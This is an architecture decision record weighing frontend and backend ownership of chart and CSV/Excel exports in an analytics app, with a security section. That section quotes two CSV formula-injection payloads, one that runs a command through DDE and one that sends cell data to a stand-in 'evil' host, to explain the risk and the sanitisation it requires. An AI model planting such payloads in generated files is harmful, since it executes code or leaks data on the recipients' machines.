# ADR: Export Feature Ownership (Frontend vs Backend)

- **Status:** Proposed (awaiting architecture team decision)
- **Date:** 2026-05-18
- **Deciders:** Architecture team
- **Scope:** Exporting chart images (PNG/SVG) and table data (CSV/Excel) from the Conversational Analytics app, in both the live chat and history views.

---

## 1. Context

Users want to export analytics results:

- **Chart** → PNG or SVG image.
- **Table data** → CSV or Excel (`.xlsx`).

This applies to the live chat response and to historical conversations.

The deciding architectural question is **where the source of truth lives** for each export type — not "frontend vs backend" in the abstract.

| Export type | Source of truth | Where it exists today |
|---|---|---|
| Chart image | The *rendered* chart | Browser only (Vega renders client-side) |
| Table data | The *SQL query result* | Backend (full result); browser only has a *derived* subset |

---

## 2. Current state (as implemented)

Export is **100% frontend** today.

- **Chart PNG/SVG** — produced from the Vega view via `view.toImageURL()`. Appropriate: pixels only exist client-side.
- **Table CSV/Excel** — reconstructed client-side from one of:
  1. the chart spec's inline `data.values` (only the **plotted** columns), or
  2. the **markdown table parsed out of the LLM's text answer** (preferred, fuller).

### Known limitations observed

1. A 3-column answer once exported only 2 columns, because the chart spec included only the plotted fields. Fixed by preferring the markdown table.
2. Table extraction depends on **parsing LLM-generated markdown / chart specs**, which is inherently approximate and has required multiple patches.

> **Key finding:** the frontend does **not** hold the authoritative result set. It exports what was *displayed/derived*, not the real SQL output. If an answer is summarised ("top 10 shown") or a column is dropped from the chart, the export is incomplete.

---

## 3. Options

### Option A — Frontend-owned (current approach)

Keep all export logic in the browser.

**Pros**
- Zero backend cost: no server CPU/memory, no new endpoints, instant downloads, scales for free.
- Chart image export must live here regardless (rendered chart is client-side only).
- No temp-file / streaming lifecycle to manage.

**Cons**
- **Not authoritative** — exports only what reached the browser; incomplete when rows are truncated or columns dropped.
- **Fragile data shape** — relies on parsing LLM markdown / chart specs (already patched twice).
- **No governance** — no per-export audit; export isn't tied to the RBAC that filtered the query.
- Formatting/column-order logic duplicated in JS.

### Option B — Backend-owned data export (chart image stays frontend)

Persist the raw query result (`result_columns` + `result_rows`) per conversation and expose an endpoint, e.g.:

```
GET /api/v1/conversations/{conversation_id}/export?format=csv|xlsx
```

that streams the file. Chart PNG/SVG remains a frontend concern.

**Pros**
- **Authoritative & complete** — exports the real SQL result (all rows/columns), independent of what the chart plotted or the LLM summarised.
- **Governed** — inherits the same RBAC that filtered the query; every export is auditable (who exported what, when). Important for customer/financial data.
- **Scales to large exports** via streaming, without bloating the browser.
- Export/formatting logic lives once, server-side.

**Cons**
- New endpoints + auth + streaming + file/stream lifecycle.
- Must **persist the result set** → storage cost and PII/retention policy decisions.
- Per-export server CPU/memory; needs rate limiting.
- Split model (chart = frontend, data = backend).

### Option C — Backend renders chart images too (rejected)

Run headless browser / Vega-SSR server-side to produce PNG/SVG.

**Rejected because:** heavy, redundant infrastructure to reproduce something the browser already renders perfectly. No benefit over Option A for images.

---

## 4. Security considerations

Export data in this app flows through an **LLM** (markdown tables are LLM-generated)
and a database, so cell values must be treated as **untrusted**. The risks below
drive the ownership decision as much as completeness does.

### 4.1 CSV / Excel formula injection (a.k.a. CSV injection) — **High**

If a cell value begins with `=`, `+`, `-`, `@` (or `\t` / `\r` variants), Excel and
Google Sheets interpret it as a **formula** when the file is opened. A crafted value
such as `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/?x="&A1)` can execute code or
exfiltrate data **on the machine of whoever opens the exported file** — not in our app,
but downstream.

- **Where it applies:** any CSV/Excel we generate, **frontend or backend**. It is a
  property of the file content, not of where the file is built.
- **Current gap:** the frontend CSV path quotes for delimiters but does **not** neutralise
  leading formula characters; the Excel path writes string cells verbatim.
- **Fix (mandatory, wherever the file is built):** for string cells beginning with a
  dangerous character, prefix with `'` (or a space / zero-width guard) so spreadsheet apps
  treat the value as text. Numbers/booleans are unaffected.

### 4.2 SVG chart export can carry script — **Medium**

The chart SVG is produced from an **LLM-controlled Vega spec**. SVG can embed `<script>`.
The downloaded `.svg` is inert on disk, but if a user re-opens it directly in a browser,
embedded script may execute in a `file://`/origin context.

- **Where it applies:** frontend chart export only.
- **Mitigation:** prefer **PNG** (raster, no script) as the default; if SVG is offered,
  sanitise/strip `<script>`/event handlers, or document the re-open risk. PNG carries no
  such risk.

### 4.3 Data integrity / tamperability — **High (governance)**

With **frontend** data export, the rows live in browser memory and can be altered before
the file is written:

- A user can edit the in-memory data via DevTools and then export the modified result.
- A malicious browser extension, compromised client-side dependency, or XSS payload runs
  in the authenticated session and can intercept/alter the data en route to the file.
- In this app specifically, the frontend data is **reconstructed** (from the chart spec or
  parsed markdown), so the file can differ from the true SQL output even without malice.

Consequence: a frontend-generated export **cannot be trusted as a system of record** — there
is no chain of custody proving it reflects what the system actually returned.

**Backend export addresses this** (not the post-download editing — nobody can prevent a user
editing their own downloaded bytes — but the trusted original and its issuance are preserved):

- The file is built from the authoritative, RBAC-filtered result the server already holds.
- The server can **audit** every export (who, what, when).
- The server can add integrity controls impossible on the frontend: a response checksum/hash,
  a watermark, or a server-retained copy for reconciliation — so post-hoc tampering is
  **detectable** and the source of truth is preserved.

### 4.4 Client-side dependency risk — **Medium (ongoing)**

Export libraries run in the user's authenticated session. We already rejected the npm `xlsx`
package (unpatched prototype-pollution / ReDoS advisories) in favour of `write-excel-file`.
Any client-side export dependency needs continuous `npm audit` in CI and pinned versions.

### 4.5 Filename handling — **Low**

Download filenames are derived from the chart title/label. These are slugified to
`[a-z0-9-]` (`baseName()`), which neutralises path/extension-spoofing tricks. Keep this strict.

### Security risk summary

| Risk | Severity | Applies to | Owner of the fix |
|---|---|---|---|
| CSV/Excel formula injection | High | Any generated CSV/Excel | Wherever the file is built (FE **and** BE) |
| Data tamperability / no integrity | High (governance) | Frontend data export | Backend (authoritative + audit + checksum) |
| SVG embedded script | Medium | Frontend chart (SVG) | Frontend (prefer PNG / sanitise SVG) |
| Client-side dependency vulns | Medium | Frontend | Frontend (CI `npm audit`, pin versions) |
| Filename spoofing | Low | Frontend | Frontend (already slugified) |

---

## 5. Recommendation

**Split ownership by source of truth.** Completeness, governance, **and the security
findings in §4** all point the same way: chart image → frontend; table data → backend.

### Recommended responsibility matrix (the "best solution")

| Concern | Frontend responsibility | Backend responsibility |
|---|---|---|
| **Chart PNG/SVG** | **Owns it.** Produce the image from the rendered Vega view. Default to PNG; sanitise SVG or warn on the re-open risk. | — |
| **Table CSV/Excel — file generation** | — | **Owns it.** Build the file from the authoritative, RBAC-filtered SQL result. |
| **Table CSV/Excel — triggering the download** | Calls the export endpoint and saves the returned file. | Streams the file with correct `Content-Type` / `Content-Disposition`. |
| **Data completeness** | — | Guarantees all rows/columns of the real result (no chart/markdown reconstruction). |
| **RBAC enforcement on export** | Sends auth/session only. | Re-applies the same RBAC that filtered the query. |
| **Audit logging** | — | Logs who exported what, when, and row count. |
| **Data integrity / tamper-evidence** | Cannot provide. | Retains/serves the authoritative original; may add checksum/watermark. |
| **CSV/Excel formula-injection sanitisation** | Apply if any file is still built client-side (interim). | **Primary owner** — sanitise at the point of file generation. |
| **Formatting (number/date/locale, column order)** | Display formatting only. | Canonical export formatting (single source of truth). |
| **Dependency security (export libs)** | `npm audit` in CI, pin versions. | Standard dependency scanning. |
| **Rate limiting / size guardrails** | — | Enforce max rows / max size; throttle export calls. |

### Rationale

- **Chart image must be frontend** — the rendered chart only exists client-side; recreating it server-side (headless browser) is wasteful (Option C, rejected). Images are not a data system-of-record, so the integrity concern does not apply.
- **Table data should be backend** because the backend is the only tier that is:
  - **Complete** — the frontend provably does not hold the full result set today.
  - **Governed** — RBAC is already enforced on queries; exports must inherit it and be auditable.
  - **Trustworthy** — only a server-generated file can be tamper-evident and serve as a system of record (§4.3).
- **Formula injection (§4.1) is mandatory regardless of owner** — but it belongs primarily to whoever generates the file (the backend, under this recommendation).

> If the team chooses to keep table export on the frontend (Option A), it **must** be labelled a *"convenience export, not a system of record,"* and the formula-injection sanitisation (§4.1) must still be implemented client-side as an interim control.

---

## 6. Decision

> _To be completed by the architecture team._

- [ ] **Option A** — Frontend owns all export (accept derived-data + integrity limitations; still implement §4.1 sanitisation).
- [ ] **Option B** — Backend owns table data export; frontend owns chart image export. *(Recommended for production/governed data.)*
- [ ] Other: _______________________________________________

**Rationale / notes:**

_(record the decision reasoning here)_

---

## 7. Consequences

**Mandatory regardless of option (security):**
- Implement CSV/Excel **formula-injection sanitisation** (§4.1) at the point of file generation.
- Default chart image export to **PNG**; sanitise or warn for SVG (§4.2).
- Keep export dependencies scanned (`npm audit` in CI) and pinned (§4.4).

**If Option A (frontend):**
- Label exports as *"convenience export, not a system of record."*
- Harden markdown/spec extraction; add tests for multi-table and wide-table cases.
- Accept that exports are not complete, not governed, and not tamper-evident.

**If Option B (backend table export + frontend chart image):**
- Capture `result_columns` / `result_rows` in the agent pipeline and persist per conversation (define retention + PII policy).
- Add the streaming export endpoint with **RBAC checks** and **audit logging**.
- Add rate limiting and max-rows / max-size guardrails.
- Add integrity controls (checksum/watermark / server-retained copy) as needed (§4.3).
- Frontend calls the endpoint for data; continues to handle chart images locally.

---

## 8. One-line summary

> **Chart image → frontend** (the rendered chart only exists client-side; not a data record). **Table data → backend** (the only tier with the complete, RBAC-filtered, auditable, tamper-evident result set). The current implementation is fully frontend and reconstructs data from the chart/markdown, which is neither authoritative nor tamper-evident. CSV/Excel **formula-injection sanitisation is mandatory wherever the file is generated**, and chart export should default to PNG.
